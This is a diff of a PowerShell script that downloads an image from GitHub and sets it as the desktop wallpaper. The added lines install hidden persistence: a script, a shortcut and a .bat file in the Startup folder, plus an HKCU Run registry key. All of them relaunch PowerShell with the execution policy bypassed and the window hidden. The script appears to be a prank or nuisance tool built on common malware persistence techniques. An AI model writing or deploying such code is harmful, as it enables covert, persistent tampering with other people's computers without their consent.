@@ -1,46 +1,90 @@
 $imageUrl = "https://raw.githubusercontent.com/kolomka-cpu/elka/refs/heads/main/m.jpeg"
 $imagePath = "$env:TEMP\wallpaper.jpg"
+$scriptPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\set_wallpaper.ps1"
+$shortcutPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\set_wallpaper.lnk"
+$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+$regName = "WallpaperSetter"
 
 try {
-    Write-Host "Loading..." -ForegroundColor Yellow
+    Write-Host "1. downloading..."
     Invoke-WebRequest -Uri $imageUrl -OutFile $imagePath -UseBasicParsing
-
-    Write-Host "Setting wallpaper..." -ForegroundColor Yellow
-
-    # ПРОСТЕЙШИЙ C# КОД - без сложных конструкций
-    Add-Type @"
-using System;
-using System.Runtime.InteropServices;
-using Microsoft.Win32;
-
-public class WallpaperChanger
-{
-    [DllImport("user32.dll", CharSet = CharSet.Auto)]
-    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
     
-    public static void SetWallpaper(string path)
-    {
-        // Устанавливаем в реестр
-        try
-        {
-            Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "Wallpaper", path);
-            Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "WallpaperStyle", "2");
-            Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "TileWallpaper", "0");
-        }
-        catch {}
-        
-        // Применяем изменения
-        SystemParametersInfo(20, 0, path, 3);
+    Write-Host "2. create psh..."
+    
+    @"
+`$imagePath = "$imagePath"
+
+try {
+    [Microsoft.Win32.Registry]::SetValue("HKCU\Control Panel\Desktop", "Wallpaper", `$imagePath)
+    [Microsoft.Win32.Registry]::SetValue("HKCU\Control Panel\Desktop", "WallpaperStyle", "2")
+    [Microsoft.Win32.Registry]::SetValue("HKCU\Control Panel\Desktop", "TileWallpaper", "0")
+    
+    Add-Type @"
+    using System;
+    using System.Runtime.InteropServices;
+    public class Wallpaper {
+        [DllImport("user32.dll", CharSet = CharSet.Auto)]
+        public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
     }
-}
 "@
-
-    # Вызываем метод
-    [WallpaperChanger]::SetWallpaper($imagePath)
-
-    Write-Host "Done!" -ForegroundColor Green
-    Write-Host "If wallpaper didn't change, try logging off and on." -ForegroundColor Yellow
+    
+    [Wallpaper]::SystemParametersInfo(20, 0, `$imagePath, 3)
+    "Wallpaper set successfully at $(Get-Date)" | Out-File "$env:TEMP\wallpaper_success.log"
 }
 catch {
-    Write-Host "Error: $_" -ForegroundColor Red
+    "Error: `$_ at $(Get-Date)" | Out-File "$env:TEMP\wallpaper_error.log"
+}
+"@ | Out-File $scriptPath -Encoding ASCII
+
+    Write-Host "3. create lnk..." -ForegroundColor Yellow
+    
+    $wshShell = New-Object -ComObject WScript.Shell
+    $shortcut = $wshShell.CreateShortcut($shortcutPath)
+    
+    $shortcut.TargetPath = "powershell.exe"
+    $shortcut.Arguments = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`""
+    $shortcut.WorkingDirectory = "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
+    $shortcut.Description = "EPOPA"
+    $shortcut.IconLocation = "powershell.exe,0"
+    $shortcut.WindowStyle = 7
+    
+    # Сохраняем ярлык
+    $shortcut.Save()
+    
+    Write-Host " : $shortcutPath" -ForegroundColor Green
+    
+    Write-Host "4. reg autostart ..." -ForegroundColor Yellow
+    
+    Set-ItemProperty -Path $regPath -Name $regName -Value "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`"" -Force
+    
+    Write-Host "   reg create : $regPath\$regName" -ForegroundColor Green
+    
+    Write-Host "5. create batch..." -ForegroundColor Yellow
+    
+    $batPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\set_wallpaper.bat"
+    @"
+@echo off
+powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\set_wallpaper.ps1"
+"@ | Out-File $batPath -Encoding ASCII
+    
+    Write-Host "   BAT: $batPath" -ForegroundColor Green
+    
+    Write-Host "`n Ready!" 
+    Write-Host "script: $scriptPath"
+    Write-Host "lnk: $shortcutPath"
+    Write-Host "reg: $regPath\$regName"
+    Write-Host "BAT: $batPath"
+    Write-Host "img: $imagePath"
+    
+    Write-Host "`n Now ..."
+    try {
+        & $scriptPath
+        Write-Host "done"
+    }
+    catch {
+        Write-Host "some error"
+    }
+}
+catch {
+    Write-Host "err: $_" -ForegroundColor Red
 }
